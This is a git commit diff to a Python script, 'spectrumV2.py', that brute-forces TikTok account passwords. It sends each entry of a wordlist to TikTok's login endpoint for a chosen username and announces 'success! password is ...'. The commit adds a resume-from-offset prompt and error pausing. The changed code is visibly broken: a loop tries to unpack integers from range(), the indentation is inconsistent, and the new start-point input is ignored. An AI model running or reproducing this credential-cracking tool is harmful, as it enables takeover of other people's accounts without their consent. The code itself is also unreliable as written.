10b7c0d30080a62731aff45b419f5be97146e37d
SimplyStatic <80294402+SimplyStatic@users.noreply.github.com>
2023-11-18 20:46:15 -0600

    Update spectrumV2.py
    Added pause function. bug fixes

--- spectrumV2.py
+++ spectrumV2.py
@@ -62,54 +62,62 @@ wordlist = input(yellow + " > wordlist: " + reset)
 
 print()
 
+start_point = input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)
+
+
 print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
 i = input(yellow + " > #: " + reset)
 password = None
 
-def brute_force(user, password, wordlist):
+def brute_force(user, password, wordlist, start_point=0):
     call(["clear"])
     with open(wordlist, 'r') as f:
         words = f.readlines()
-    for i, word in enumerate(words):
-        word = word.strip()
+    for i, word in range(start_point, len(words)):
+        word = words[i].strip()
         print(adv, f"cracking account...",f"{i+1}/{len(words)}", reset)
-        response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
-            "username": user,
-            "password": word,
-            "mix_mode": True,
-            "captcha": "",
-            "email": "",
-            "mobile": "",
-            "account": "",
-            "type": 1,
-            "app_id": 1233,
-            "device_id": "",
-            "iid": "",
-            "os_version": "",
-            "channel": "",
-            "device_platform": "",
-            "request_id": "",
-            "captcha_app": "",
-            "captcha_type": "",
-            "google_account": "",
-            "google_captcha": "",
-            "google_token": "",
-            "fb_account": "",
-            "fb_code": "",
-            "fb_token": "",
-            "apple_id": "",
-            "apple_token": "",
-            "apple_email": "",
-            "apple_code": "",
-            "mix_string": word
+        try: 
+           response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
+              "username": user,
+              "password": word,
+              "mix_mode": True,
+              "captcha": "",
+              "email": "",
+              "mobile": "",
+              "account": "",
+              "type": 1,
+              "app_id": 1233,
+              "device_id": "",
+              "iid": "",
+              "os_version": "",
+              "channel": "",
+              "device_platform": "",
+              "request_id": "",
+              "captcha_app": "",
+              "captcha_type": "",
+              "google_account": "",
+              "google_captcha": "",
+              "google_token": "",
+              "fb_account": "",
+              "fb_code": "",
+              "fb_token": "",
+              "apple_id": "",
+              "apple_token": "",
+              "apple_email": "",
+              "apple_code": "",
+              "mix_string": word
         })
         if response.status_code == 200:
+                print()
+                print(green + f" success! password is {word}" + reset)
+                break
+            else:
+                print()
+                print(red + f"failed! password not found in {wordlist}" + reset)
+        except Exception as e:
             print()
-            print(green + f" success! password is {word}" + reset)
-            break
-        else:
-            print()
-            print(red + f"failed! password not found in {wordlist}" + reset)
+            print(red + f"Error: {e}. Pausing for user input..." + reset)
+            input("Press Enter to resume...")
 
 
-brute_force(user, password, wordlist)
+brute_force(user, password, wordlist, start_point=0)
